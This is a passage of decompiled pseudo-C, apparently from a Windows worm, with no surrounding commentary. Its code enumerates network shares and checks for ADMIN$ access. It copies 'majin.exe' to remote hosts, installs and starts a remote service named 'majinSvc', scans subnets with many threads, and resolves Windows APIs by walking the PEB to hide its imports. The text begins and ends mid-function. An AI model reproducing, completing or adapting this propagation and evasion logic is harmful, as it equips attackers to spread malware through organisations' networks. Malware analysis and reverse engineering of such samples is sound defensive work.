    v83[0] = 0;
    LODWORD(v5) = qword_140018A58(v86, 1, &v82, 0xFFFFFFFFLL, &v89, v83, &v90);
    v81 = v5;
    v6 = v5;
    if ( (_DWORD)v5 != 0 && (_DWORD)v5 != 234 )
      break;
    v7 = 0;
    if ( v89 == 0 )
      goto LABEL_27;
    do
    {
      if ( a2 != 0 )
      {
        v8 = 24LL * v7;
        LODWORD(v5) = lstrcmpiW(*(LPCWSTR *)(v8 + v82), L"ADMIN$");
        if ( (_DWORD)v5 == 0 )
        {
          v4 = 1;
          goto LABEL_25;
        }
      }
      else
      {
        v8 = 24LL * v7;
      }
      LODWORD(v5) = lstrcmpiW(*(LPCWSTR *)(v8 + v82), L"IPC$");
      if ( (_DWORD)v5 != 0 )
      {
        LODWORD(v5) = lstrcmpiW(*(LPCWSTR *)(v8 + v82), L"PRINT$");
        if ( (_DWORD)v5 != 0 )
        {
          LODWORD(v5) = lstrcmpiW(*(LPCWSTR *)(v8 + v82), L"ADMIN$");
          if ( (_DWORD)v5 != 0 && a2 == 0 )
          {
            LODWORD(v5) = v82;
            if ( (*(_DWORD *)(v8 + v82 + 8) & 0x7FFFFFFF) == 0 )
            {
              qword_140018878(65001, 0, *(_QWORD *)(v8 + v82), 0xFFFFFFFFLL, v87, 256, 0, 0);
              v5 = sub_1400040C0((__int64)"\\\\", v3);
              v9 = v5;
              if ( v5 != 0 )
              {
                v10 = sub_1400040C0(v5, (__int64)v87);
                v11 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
                v12 = v10;
                v15 = qword_140018740(v14, v13);
                LODWORD(v5) = v11(v15, 0, v9);
                if ( v12 != 0 )
                {
                  sub_140008AA0((__int64)"STRESS: share ");
                  sub_140008AA0(v12);
                  sub_140008AA0((__int64)"\r\n");
                  v16 = (__int64 (__fastcall *)(__int64, __int64, __int64))qword_140018768;
                  v19 = qword_140018740(v18, v17);
                  v22 = (__int64 *)v16(v19, 8, 16);
                  if ( v22 != nullptr )
                  {
                    v23 = qword_1400187C8(v12);
                    v24 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018768;
                    v25 = (unsigned int)(v23 + 1);
                    v26 = (int)v25;
                    v28 = qword_140018740(v25, v27);
                    v29 = v24(v28, 0, v26);
                    *v22 = v29;
                    if ( v29 != 0 )
                    {
                      sub_14000A820(v29, v12, v26);
                      qword_140018690(&unk_1400180F8);
                      v34 = qword_1400180F0;
                      v22[1] = 0;
                      if ( v34 != 0 )
                        *(_QWORD *)(v34 + 8) = v22;
                      else
                        qword_1400180E8 = (__int64)v22;
                      qword_1400180F0 = (__int64)v22;
                      qword_140018790(&unk_1400180F8);
                      qword_140018800(qword_140018120, 1, 0);
                    }
                    else
                    {
                      v32 = (void (__fastcall *)(__int64, _QWORD, __int64 *))qword_140018770;
                      v33 = qword_140018740(v31, v30);
                      v32(v33, 0, v22);
                    }
                  }
                  v35 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
                  v36 = qword_140018740(v21, v20);
                  LODWORD(v5) = v35(v36, 0, v12);
                }
                v3 = a1;
              }
            }
          }
        }
      }
LABEL_25:
      ++v7;
    }
    while ( v7 < v89 );
    v6 = v81;
LABEL_27:
    if ( v82 != 0 )
      LODWORD(v5) = qword_140018A60();
  }
  while ( v6 == 234 );
  if ( v4 == 0 || a2 == 0 )
    return v5;
  if ( dword_14001700C != 0 )
  {
    if ( dword_140017ED0 != 0 && dword_1400176A4 != 0 )
    {
      qword_140018690(&unk_140017EA8);
      v37 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v37 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v38 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v39 = qword_1400187C8("STRESS: ADMIN$ on ");
        v38(v37, "STRESS: ADMIN$ on ", v39, &v81, 0);
      }
      qword_140018790(&unk_140017EA8);
    }
    sub_140008AA0(v3);
    if ( dword_140017ED0 != 0 && dword_1400176A4 != 0 )
    {
      qword_140018690(&unk_140017EA8);
      v40 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v40 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v41 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v42 = qword_1400187C8(" deploy\r\n");
        v41(v40, " deploy\r\n", v42, &v81, 0);
      }
      qword_140018790(&unk_140017EA8);
    }
  }
  v43 = sub_1400040C0((__int64)"\\\\", v3);
  v44 = v43;
  if ( v43 == 0 )
    goto LABEL_52;
  v45 = sub_1400040C0(v43, (__int64)"ADMIN$\\Temp\\majin.exe");
  v46 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
  v47 = v45;
  v50 = qword_140018740(v49, v48);
  v46(v50, 0, v44);
  if ( v47 == 0 )
    goto LABEL_52;
  v51 = sub_140003DE0((__int64)&unk_140017AA8);
  v52 = sub_140003DE0(v47);
  v55 = v52;
  if ( v51 == nullptr )
  {
    if ( v52 != nullptr )
      goto LABEL_63;
    goto LABEL_65;
  }
  if ( v52 == nullptr )
  {
    v74 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
    v75 = qword_140018740(v54, v53);
    v74(v75, 0, v51);
    goto LABEL_65;
  }
  if ( (unsigned int)qword_140018890(v51, v52, 0) != 0 )
  {
    v60 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
    v61 = qword_140018740(v57, v56);
    v60(v61, 0, v51);
    v62 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
    v65 = qword_140018740(v64, v63);
    v62(v65, 0, v55);
    v66 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
    v69 = qword_140018740(v68, v67);
    v66(v69, 0, v47);
    v3 = a1;
LABEL_52:
    v5 = qword_1400188F8(v3, 0, 2);
    v70 = v5;
    if ( v5 != 0 )
    {
      qword_1400187B0(v87, "C:\\Windows\\Temp\\majin.exe ");
      v71 = qword_1400187C8(&unk_1400176A8);
      if ( (int)(v71 + qword_1400187C8(v87)) < 1024 )
      {
        v72 = qword_1400187C8(v87);
        qword_1400187B0(&v87[v72], &unk_1400176A8);
      }
      v73 = qword_1400188F0(v70, "majinSvc", "majinSvc", 65584, 16, 3, 0, v87, 0, 0, 0, 0, 0);
      if ( v73 != 0 || (unsigned int)qword_140018710() == 1073 && (v73 = qword_140018900(v70, "majinSvc", 16)) != 0 )
      {
        qword_140018908(v73, 0, 0);
        qword_1400188E8(v73);
      }
      LODWORD(v5) = qword_1400188E8(v70);
    }
    return v5;
  }
  if ( dword_14001700C != 0 )
    sub_140008AA0((__int64)"STRESS: CopyFileW FAILED\r\n");
  v58 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
  v59 = qword_140018740(v57, v56);
  v58(v59, 0, v51);
LABEL_63:
  v76 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
  v77 = qword_140018740(v54, v53);
  v76(v77, 0, v55);
LABEL_65:
  v78 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
  v79 = qword_140018740(v54, v53);
  LODWORD(v5) = v78(v79, 0, v47);
  return v5;
}


// ----- sub_140009590 @ 0x140009590 -----
char __fastcall sub_140009590(unsigned int a1, _BYTE *a2)
{
  __int64 v4; // rdi
  unsigned int v5; // r10d
  signed int v6; // r8d
  __int64 v7; // rdx
  __int64 v8; // rax
  unsigned int v9; // r8d
  _BYTE *v10; // rbx
  signed int v11; // ecx
  unsigned int v12; // r8d
  _BYTE *v13; // rbx
  __int64 v14; // r10
  __int64 v15; // rax
  signed int v16; // ecx
  int v17; // edx
  unsigned int v18; // r8d
  __int64 v19; // r11
  _BYTE *v20; // rbx
  signed int v21; // r8d

  if ( (unsigned __int8)a1 < 0x64u )
  {
    if ( (unsigned __int8)a1 < 0xAu )
    {
      v8 = 1;
      *a2 = a1 + 48;
      v4 = 4;
      v7 = 2;
      v9 = 5;
      v5 = 3;
    }
    else
    {
      v4 = 5;
      v5 = 4;
      *a2 = (unsigned __int8)a1 / 0xAu + 48;
      v7 = 3;
      v8 = 2;
      a2[1] = (unsigned __int8)a1 % 0xAu + 48;
      v9 = 6;
    }
  }
  else
  {
    v4 = 6;
    v5 = 5;
    *a2 = (unsigned __int8)a1 / 0x64u + 48;
    v6 = (unsigned __int8)a1 % 0x64u;
    a2[1] = v6 / 10 + 48;
    v7 = 4;
    v8 = 3;
    a2[2] = v6 % 10 + 48;
    v9 = 7;
  }
  a2[v8] = 46;
  v10 = &a2[v7];
  if ( BYTE1(a1) < 0x64u )
  {
    if ( BYTE1(a1) < 0xAu )
    {
      v9 = v5;
      *v10 = BYTE1(a1) + 48;
    }
    else
    {
      v9 = v5 + 1;
      *v10 = BYTE1(a1) / 0xAu + 48;
      a2[v5] = BYTE1(a1) % 0xAu + 48;
    }
  }
  else
  {
    *v10 = BYTE1(a1) / 0x64u + 48;
    v11 = BYTE1(a1) % 0x64u;
    v10[1] = v11 / 10 + 48;
    a2[v4] = v11 % 10 + 48;
  }
  v15 = v9;
  v12 = v9 + 1;
  v13 = &a2[v12];
  a2[v15] = 46;
  v14 = v12 + 1;
  LODWORD(v15) = HIWORD(a1);
  LOBYTE(v16) = BYTE2(a1);
  if ( BYTE2(a1) >= 0x64u )
  {
    v14 = v12 + 2;
    *v13 = BYTE2(a1) / 0x64u + 48;
    v16 = BYTE2(a1) % 0x64u;
    v17 = v16 / 10;
    v13[1] = v16 / 10 + 48;
LABEL_13:
    LOBYTE(v15) = 10 * v17;
    a2[v14] = v16 - 10 * v17 + 48;
    goto LABEL_17;
  }
  if ( BYTE2(a1) >= 0xAu )
  {
    LOBYTE(v17) = BYTE2(a1) / 0xAu;
    *v13 = BYTE2(a1) / 0xAu + 48;
    goto LABEL_13;
  }
  LODWORD(v14) = v12;
  *v13 = BYTE2(a1) + 48;
LABEL_17:
  v18 = HIBYTE(a1);
  v19 = (unsigned int)(v14 + 3);
  v20 = &a2[(int)v14];
  a2[(unsigned int)v14 + 1] = 46;
  if ( (unsigned __int8)v18 < 0x64u )
  {
    if ( (unsigned __int8)v18 < 0xAu )
    {
      v20[2] = v18 + 48;
      a2[v19] = 0;
    }
    else
    {
      v20[2] = v18 / 0xA + 48;
      v15 = (unsigned int)(v14 + 4);
      a2[v19] = v18 % 0xA + 48;
      a2[v15] = 0;
    }
  }
  else
  {
    v20[2] = v18 / 0x64 + 48;
    v21 = v18 % 0x64;
    v20[3] = v21 / 10 + 48;
    v15 = (unsigned int)(v14 + 5);
    a2[(unsigned int)(v14 + 4)] = v21 % 10 + 48;
    a2[v15] = 0;
  }
  return v15;
}


// ----- sub_140009850 @ 0x140009850 -----
__int64 sub_140009850()
{
  const char *v1; // rcx
  unsigned int *v2; // rbx
  unsigned int v3; // r9d
  __int64 v4; // r8
  char v5; // al
  unsigned int v6; // ecx
  __int64 v7; // rdx
  __int64 i; // r9
  char v9; // cl
  bool v10; // zf
  __int64 v11; // rdi
  void (__fastcall *v12)(__int64, _BYTE *, _QWORD, char *, _QWORD); // rbx
  unsigned int v13; // eax
  __int64 v14; // rdx
  int v15; // r15d
  int v16; // eax
  int v17; // r13d
  __int64 v18; // rdx
  signed int v19; // esi
  int v20; // edi
  HANDLE *v21; // r14
  int v22; // r12d
  _BOOL8 v23; // rcx
  int v24; // ebp
  __int64 (__fastcall *v25)(__int64, __int64, __int64); // rbx
  __int64 v26; // rax
  unsigned int *v27; // rax
  __int64 v28; // rax
  __int64 j; // rbx
  _BYTE v30[16]; // [rsp+30h] [rbp-238h] BYREF
  unsigned int v31; // [rsp+40h] [rbp-228h]
  int v32; // [rsp+44h] [rbp-224h]
  unsigned int *v33; // [rsp+48h] [rbp-220h]
  char v34[8]; // [rsp+50h] [rbp-218h] BYREF
  char v35[32]; // [rsp+58h] [rbp-210h] BYREF
  int v36; // [rsp+78h] [rbp-1F0h]
  HANDLE Handles[52]; // [rsp+90h] [rbp-1D8h] BYREF
  int v38; // [rsp+278h] [rbp+10h]
  unsigned int v39; // [rsp+280h] [rbp+18h]
  int v40; // [rsp+288h] [rbp+20h]

  sub_140008AA0((__int64)"STRESS: scan start\r\n");
  if ( (unsigned int)qword_1400189D0(514, Handles) != 0 )
  {
    sub_140008AA0((__int64)"STRESS: WSAStartup FAIL\r\n");
    return 1;
  }
  else
  {
    if ( (unsigned int)qword_140018A48(Handles, 256) != -1 )
      qword_140018128 = qword_140018A40(Handles);
    if ( (unsigned int)sub_140008C90() != 0 )
    {
      sub_140008AA0((__int64)"STRESS: subnets=");
      sub_140008B40(dword_140017EDC);
      sub_140008AA0((__int64)"\r\n");
      v40 = 0;
      if ( dword_140017EDC > 0 )
      {
        v2 = dword_140018130;
        v33 = dword_140018130;
        do
        {
          sub_140008AA0((__int64)"STRESS: subnet ");
          v3 = *v2;
          v4 = 0;
          if ( *v2 != 0 )
          {
            do
            {
              v5 = 48;
              v6 = v3 & 0xF;
              v7 = v4;
              if ( v6 >= 0xA )
                v5 = 55;
              v3 >>= 4;
              v30[v4++] = v6 + v5;
            }
            while ( v3 != 0 );
            for ( i = 0; i < v7; --v7 )
            {
              v9 = v30[i];
              v30[i++] = v30[v7];
              v30[v7] = v9;
            }
          }
          else
          {
            v30[0] = 48;
            v4 = 1;
          }
          v10 = dword_140017ED0 == 0;
          v30[v4] = 0;
          if ( !v10 && dword_1400176A4 != 0 )
          {
            qword_140018690(&unk_140017EA8);
            v11 = qword_140018750(4294967285LL);
            if ( (unsigned __int64)(v11 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
            {
              v12 = (void (__fastcall *)(__int64, _BYTE *, _QWORD, char *, _QWORD))qword_140018880;
              v13 = qword_1400187C8(v30);
              v12(v11, v30, v13, v34, 0);
              v2 = v33;
            }
            qword_140018790(&unk_140017EA8);
          }
          sub_140008AA0((__int64)"\r\n");
          v32 = dword_140017694;
          v31 = *v2;
          qword_140018708(v35, v14);
          v15 = 2 * v36;
          if ( 2 * v36 >= 1 )
          {
            v17 = 1;
            if ( v15 <= 32 )
            {
              v18 = (unsigned int)(254 % v15);
              v16 = 254 / v15;
            }
            else
            {
              v16 = 7;
              v15 = 32;
              v18 = 30;
            }
          }
          else
          {
            v15 = 1;
            v16 = 254;
            v17 = 1;
            v18 = 0;
          }
          v19 = 0;
          v39 = v18;
          v20 = 0;
          v38 = v16;
          v21 = Handles;
          do
          {
            v22 = v17;
            v23 = v20 < (int)v18;
            v24 = v16 + v17 + v23 - 1;
            if ( v24 > 254 )
              v24 = 254;
            v17 = v24 + 1;
            if ( v22 > 254 )
              break;
            v25 = (__int64 (__fastcall *)(__int64, __int64, __int64))qword_140018768;
            v26 = qword_140018740(v23, v18);
            v27 = (unsigned int *)v25(v26, 8, 16);
            if ( v27 != nullptr )
            {
              *v27 = v31;
              v27[3] = v32;
              v27[1] = v22;
              v27[2] = v24;
              v28 = qword_140018678(0, 0, sub_140009C90, v27, 0, 0);
              if ( v28 != 0 )
              {
                ++v19;
                *v21++ = (HANDLE)v28;
              }
            }
            v16 = v38;
            ++v20;
            v18 = v39;
          }
          while ( v20 < v15 );
          if ( v19 > 0 )
            WaitForMultipleObjects(v19, Handles, true, 0xFFFFFFFF);
          for ( j = 0; j < v19; qword_140018640(Handles[j++]) )
            ;
          v2 = v33 + 1;
          ++v40;
          ++v33;
        }
        while ( v40 < dword_140017EDC );
      }
      v1 = "STRESS: scan done\r\n";
    }
    else
    {
      v1 = "STRESS: no subnets\r\n";
    }
    sub_140008AA0((__int64)v1);
    qword_1400189D8();
    return 0;
  }
}


// ----- sub_140009C90 @ 0x140009c90 -----
__int64 __fastcall sub_140009C90(_DWORD *a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  int v4; // ebx
  __int64 v5; // r11
  unsigned int **v6; // r10
  __int64 v7; // r8
  unsigned __int32 v8; // r9d
  unsigned int *v9; // rax
  __int64 v10; // rsi
  void (__fastcall *v11)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v12; // eax
  void (__fastcall *v13)(__int64, _QWORD, _DWORD *); // rbx
  __int64 v14; // rax
  _BYTE v16[24]; // [rsp+30h] [rbp-18h] BYREF
  char v17; // [rsp+50h] [rbp+8h] BYREF

  sub_140008AA0((__int64)"STRESS: worker hi=");
  sub_140008B40(a1[1]);
  sub_140008AA0((__int64)"-");
  sub_140008B40(a1[2]);
  sub_140008AA0((__int64)"\r\n");
  v4 = a1[1];
  if ( v4 <= a1[2] )
  {
    v5 = qword_140018128;
    do
    {
      v3 = *a1 | (unsigned int)(v4 << 24);
      if ( v5 != 0 && (v6 = *(unsigned int ***)(v5 + 24), v7 = 0, v8 = _byteswap_ulong(v3), v9 = *v6, *v6 != nullptr) )
      {
        while ( 1 )
        {
          v2 = *v9;
          if ( (_DWORD)v2 == (_DWORD)v3 || (_DWORD)v2 == v8 )
            break;
          v9 = v6[++v7];
          if ( v9 == nullptr )
            goto LABEL_8;
        }
      }
      else
      {
LABEL_8:
        sub_140009590(v3, v16);
        sub_140008E70((__int64)v16, a1[3]);
        v5 = qword_140018128;
      }
      ++v4;
    }
    while ( v4 <= a1[2] );
  }
  if ( dword_140017ED0 != 0 && dword_1400176A4 != 0 )
  {
    qword_140018690(&unk_140017EA8);
    v10 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v10 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v11 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
      v12 = qword_1400187C8("STRESS: worker done\r\n");
      v11(v10, "STRESS: worker done\r\n", v12, &v17, 0);
    }
    qword_140018790(&unk_140017EA8);
  }
  v13 = (void (__fastcall *)(__int64, _QWORD, _DWORD *))qword_140018770;
  v14 = qword_140018740(v3, v2);
  v13(v14, 0, a1);
  return 0;
}


// ----- sub_140009DF0 @ 0x140009df0 -----
__int64 __fastcall sub_140009DF0(__int64 a1)
{
  __int64 *v2; // rbx
  void (__fastcall *v3)(__int64, _QWORD, __int64); // rsi
  __int64 v4; // rdi
  __int64 v5; // rdx
  __int64 v6; // rcx
  __int64 v7; // rax
  void (__fastcall *v8)(__int64, _QWORD, __int64 *); // rdi
  __int64 v9; // rdx
  __int64 v10; // rcx
  __int64 v11; // rax
  _DWORD v13[18]; // [rsp+30h] [rbp-48h] BYREF

  sub_140007020((__int64)v13, a1, 0x800000, dword_1400176A0, dword_14001769C);
  v13[2] = dword_1400176A4;
  qword_140018870(qword_140018120, 2000);
  while ( dword_140017ED8 == 0 )
  {
    qword_140018690(&unk_1400180F8);
    v2 = (__int64 *)qword_1400180E8;
    if ( qword_1400180E8 != 0 )
    {
      qword_1400180E8 = *(_QWORD *)(qword_1400180E8 + 8);
      if ( qword_1400180E8 == 0 )
        qword_1400180F0 = 0;
    }
    qword_140018790(&unk_1400180F8);
    if ( v2 != nullptr )
    {
      if ( dword_14001700C != 0 )
      {
        sub_140008AA0((__int64)"STRESS: unc_task ");
        sub_140008AA0(*v2);
        sub_140008AA0((__int64)"\r\n");
      }
      sub_140007050(v13, (_BYTE *)*v2);
      v3 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
      v4 = *v2;
      v7 = qword_140018740(v6, v5);
      v3(v7, 0, v4);
      v8 = (void (__fastcall *)(__int64, _QWORD, __int64 *))qword_140018770;
      v11 = qword_140018740(v10, v9);
      v8(v11, 0, v2);
    }
    qword_140018870(qword_140018120, 2000);
  }
  qword_140018868(a1, 0, 0x8000);
  return 0;
}


// ----- sub_140009F80 @ 0x140009f80 -----
__int64 __fastcall sub_140009F80(__int64 a1)
{
  __int64 result; // rax
  bool v3; // cc

  sub_14000A820(&dword_140017690, a1, 2072);
  qword_140018788(&unk_1400180F8);
  result = qword_140018670(0, 0, 0xFFFF, 0);
  v3 = *(_DWORD *)(a1 + 8) <= 0;
  qword_140018120 = result;
  if ( v3 )
    dword_140017698 = 750;
  return result;
}


// ----- sub_140009FE0 @ 0x140009fe0 -----
__int64 sub_140009FE0()
{
  int v1; // ebx
  __int64 v2; // rdx
  __int64 v3; // rsi
  __int64 i; // rbx
  __int64 v5; // rax
  __int64 v6; // rdi
  void *v7; // rax
  _BYTE v8[32]; // [rsp+30h] [rbp-38h] BYREF
  int v9; // [rsp+50h] [rbp-18h]

  if ( dword_140017690 == 0 )
    return 0;
  v1 = 1;
  if ( dword_1400176A4 != 0 )
    dword_14001700C = 1;
  if ( dword_140017ED0 == 0 )
  {
    qword_140018788(&unk_140017EA8);
    dword_140017ED0 = 1;
  }
  sub_140008AA0((__int64)"STRESS: start\r\n");
  dword_140017ED8 = 0;
  nCount = 0;
  qword_140018708(v8, v2);
  if ( v9 >= 1 )
  {
    v1 = v9;
    if ( v9 > 64 )
      v1 = 64;
  }
  v3 = v1;
  for ( i = 0; i < v3; ++i )
  {
    v5 = qword_140018860(0, 0x800000, 12288, 4);
    v6 = v5;
    if ( v5 == 0 )
      break;
    v7 = (void *)qword_140018678(0, 0, sub_140009DF0, v5, 0, 0);
    Handles[i] = v7;
    if ( v7 == nullptr )
    {
      qword_140018868(v6, 0, 0x8000);
      break;
    }
    ++nCount;
  }
  if ( dword_14001700C != 0 )
  {
    sub_140008AA0((__int64)"STRESS: unc_workers=");
    sub_140008B40(nCount);
    sub_140008AA0((__int64)"\r\n");
  }
  qword_1400180E0 = qword_140018678(0, 0, sub_140009850, 0, 0, 0);
  return (unsigned int)(qword_1400180E0 != 0) - 1;
}


// ----- sub_14000A180 @ 0x14000a180 -----
void sub_14000A180()
{
  signed int v0; // ebx
  int v1; // eax
  HANDLE *v2; // rdi
  signed int v3; // esi

  if ( dword_140017690 != 0 )
  {
    v0 = 0;
    if ( qword_1400180E0 != 0 )
    {
      qword_140018870(qword_1400180E0, 0xFFFFFFFFLL);
      qword_140018640(qword_1400180E0);
      qword_1400180E0 = 0;
    }
    v1 = nCount;
    v2 = Handles;
    dword_140017ED8 = 1;
    v3 = 0;
    if ( (int)nCount > 0 )
    {
      do
      {
        qword_140018800(qword_140018120, 1, 0);
        v1 = nCount;
        ++v3;
      }
      while ( v3 < (int)nCount );
      if ( (int)nCount > 0 )
      {
        WaitForMultipleObjects(nCount, Handles, true, 0xFFFFFFFF);
        v1 = nCount;
      }
    }
    if ( v1 > 0 )
    {
      do
      {
        qword_140018640(*v2);
        ++v0;
        ++v2;
      }
      while ( v0 < (int)nCount );
    }
  }
}


// ----- sub_14000A270 @ 0x14000a270 -----
__int64 sub_14000A270()
{
  struct _PEB *v1; // rax
  struct _PEB_LDR_DATA *Ldr; // rcx
  struct _LIST_ENTRY *Flink; // r11
  struct _LIST_ENTRY *v4; // rbx
  struct _LIST_ENTRY *v5; // r9
  const char *i; // r10
  unsigned __int8 v7; // r8
  __int16 v8; // dx
  __int64 Blink_high; // rax
  __int64 v10; // rcx
  unsigned int *v11; // r9
  __int64 v12; // rdi
  unsigned int v13; // r11d
  __int64 v14; // rsi
  unsigned int v15; // r10d
  const char *v16; // rdx
  char *v17; // rcx
  char j; // al
  struct _LIST_ENTRY *v19; // r15
  __int64 m; // rdx
  __int64 v21; // r8
  __int64 (__fastcall *v22)(char *, __int64, __int64, __int64); // r12
  char **v23; // rbx
  __int64 k; // r14
  __int64 v25; // r9
  __int64 v26; // r11
  _BYTE **v27; // r10
  _BYTE *v28; // rax
  char *v29; // rcx
  __int64 v30; // rax
  char *v31; // rcx
  __int64 v32; // rdx
  __int64 v33; // rax
  unsigned __int64 v34; // rbx
  unsigned __int64 v35; // rcx
  __m128i v36; // xmm2
  __m128i v37; // xmm1
  __m128i v38; // xmm0
  __m128i v39; // xmm1
  unsigned __int64 v40; // rax
  __int64 v41; // rax
  __int64 v42; // rdi
  __int64 v43; // r9
  _BYTE *v44; // rcx
  __int64 v45; // r8
  unsigned __int64 n; // rbx
  char *v47; // rcx
  int v48; // r8d
  __int64 v49; // rax
  char v50; // dl
  signed __int64 v51; // r9
  char *v52; // rcx
  int v53; // r8d
  __int64 v54; // rax
  char ii; // dl
  _BYTE v56[15]; // [rsp+30h] [rbp-D0h] BYREF
  _BYTE v57[65]; // [rsp+3Fh] [rbp-C1h] BYREF
  _WORD v58[128]; // [rsp+80h] [rbp-80h] BYREF
  char v59; // [rsp+1B0h] [rbp+B0h] BYREF

  if ( dword_140018BF0 != 0 )
    return 1;
  v1 = NtCurrentPeb();
  if ( v1 == nullptr )
    return 0;
  Ldr = v1->Ldr;
  if ( Ldr == nullptr )
    return 0;
  Flink = Ldr->InMemoryOrderModuleList.Flink;
  if ( Flink == nullptr )
    return 0;
  while ( 1 )
  {
    if ( Flink == &Ldr->InMemoryOrderModuleList )
      return 0;
    v4 = Flink[2].Flink;
    if ( v4 != nullptr )
    {
      v5 = Flink[5].Flink;
      if ( v5 != nullptr )
        break;
    }
LABEL_17:
    Flink = Flink->Flink;
    if ( Flink == nullptr )
      return 0;
  }
  for ( i = "kernel32.dll"; ; ++i )
  {
    v7 = *i;
    v8 = LOWORD(v5->Flink) + 32;
    if ( (unsigned __int16)(LOWORD(v5->Flink) - 65) > 0x19u )
      v8 = (__int16)v5->Flink;
    if ( (unsigned __int8)(*i - 65) <= 0x19u )
      v7 += 32;
    if ( v8 != v7 )
      goto LABEL_17;
    if ( v8 == 0 )
      break;
    v5 = (struct _LIST_ENTRY *)((char *)v5 + 2);
  }
  if ( LOWORD(v4->Flink) != 23117 )
    return 0;
  Blink_high = SHIDWORD(v4[3].Blink);
  if ( *(_DWORD *)((char *)&v4->Flink + Blink_high) != 17744 )
    return 0;
  v10 = *(unsigned int *)((char *)&v4[8].Blink + Blink_high);
  if ( (_DWORD)v10 == 0 )
    return 0;
  v11 = (unsigned int *)((char *)v4 + *(unsigned int *)((char *)&v4[2].Flink + v10));
  v12 = (__int64)v4 + *(unsigned int *)((char *)&v4[2].Flink + v10 + 4);
  v13 = *(_DWORD *)((char *)&v4[1].Blink + v10);
  v14 = (__int64)v4 + *(unsigned int *)((char *)&v4[1].Blink + v10 + 4);
  v15 = 0;
  if ( v13 == 0 )
    return 0;
  while ( 1 )
  {
    v16 = "GetProcAddress";
    v17 = (char *)v4 + *v11;
    if ( v17 != nullptr )
    {
      for ( j = *v17; j != 0; ++v16 )
      {
        if ( *v16 == 0 )
          break;
        if ( j != *v16 )
          goto LABEL_29;
        j = *++v17;
      }
      if ( *v17 == *v16 )
        break;
    }
LABEL_29:
    ++v15;
    ++v11;
    if ( v15 >= v13 )
      return 0;
  }
  v19 = (struct _LIST_ENTRY *)((char *)v4 + *(unsigned int *)(v14 + 4LL * *(unsigned __int16 *)(v12 + 2LL * v15)));
  if ( v19 == nullptr )
    return 0;
  v22 = (__int64 (__fastcall *)(char *, __int64, __int64, __int64))((__int64 (__fastcall *)(struct _LIST_ENTRY *, const char *))v19)(
                                                                     v4,
                                                                     "LoadLibraryA");
  if ( v22 == nullptr )
    return 0;
  v23 = off_140010510;
  for ( k = 182; k != 0; --k )
  {
    v25 = 0;
    v26 = 0;
    if ( dword_140018BF8 <= 0 )
      goto LABEL_44;
    v27 = (_BYTE **)qword_140018C00;
    while ( 1 )
    {
      v28 = *v27;
      v29 = *v23;
      if ( *v27 != nullptr && *v23 != nullptr )
      {
        for ( m = (unsigned __int8)*v28; (_BYTE)m != 0; ++v29 )
        {
          v21 = (unsigned __int8)*v29;
          if ( (_BYTE)v21 == 0 )
            break;
          if ( (_BYTE)m != (_BYTE)v21 )
            goto LABEL_43;
          m = (unsigned __int8)*++v28;
        }
        if ( *v28 == *v29 )
          break;
      }
LABEL_43:
      v25 = (unsigned int)(v25 + 1);
      ++v26;
      v27 += 2;
      if ( (int)v25 >= dword_140018BF8 )
        goto LABEL_44;
    }
    v30 = qword_140018C00[2 * v26 + 1];
    if ( v30 == 0 )
    {
LABEL_44:
      v30 = v22(*v23, m, v21, v25);
      if ( v30 == 0 )
        goto LABEL_49;
      if ( dword_140018BF8 < 16 )
      {
        v31 = *v23;
        v32 = 2LL * dword_140018BF8++;
        qword_140018C00[v32] = v31;
        qword_140018C00[v32 + 1] = v30;
      }
    }
    v33 = ((__int64 (__fastcall *)(__int64, char *))v19)(v30, v23[1]);
    if ( v33 != 0 )
      *(_QWORD *)v23[2] = v33;
LABEL_49:
    v23 += 3;
  }
  if ( qword_140018898 != 0 )
  {
    v34 = 0;
    v35 = 0;
    if ( dword_14001768C < 2 )
      goto LABEL_82;
    v36 = 0;
    v37 = 0;
    do
    {
      v36 = _mm_sub_epi64(
              v36,
              _mm_cmpeq_epi64(_mm_loadu_si128((const __m128i *)(&qword_140018640 + v35)), (__m128i)0LL));
      v38 = _mm_loadu_si128((const __m128i *)(&qword_140018640 + v35 + 2));
      v35 += 4LL;
      v37 = _mm_sub_epi64(v37, _mm_cmpeq_epi64(v38, (__m128i)0LL));
    }
    while ( v35 < 0xB4 );
    v39 = _mm_add_epi64(v37, v36);
    v34 = _mm_add_epi64(v39, _mm_srli_si128(v39, 8)).m128i_u64[0];
    if ( v35 < 0xB6 )
    {
LABEL_82:
      do
      {
        v40 = v34 + 1;
        if ( *(&qword_140018640 + v35) != nullptr )
          v40 = v34;
        ++v35;
        v34 = v40;
      }
      while ( v35 < 0xB6 );
    }
    if ( v34 != 0 && qword_140018880 != nullptr && qword_140018750 != nullptr )
    {
      v41 = qword_140018750(4294967285LL);
      v42 = v41;
      if ( v41 != 0 && v41 != -1 )
      {
        v43 = 0;
        do
        {
          v57[v43++ + 49] = v34 % 0xA + 48;
          v34 /= 0xAu;
        }
        while ( v34 != 0 && v43 < 15 );
        qmemcpy(v56, "\r\n[WARN] NULL: ", sizeof(v56));
        v44 = v57;
        v45 = (unsigned int)(v43 + 15);
        do
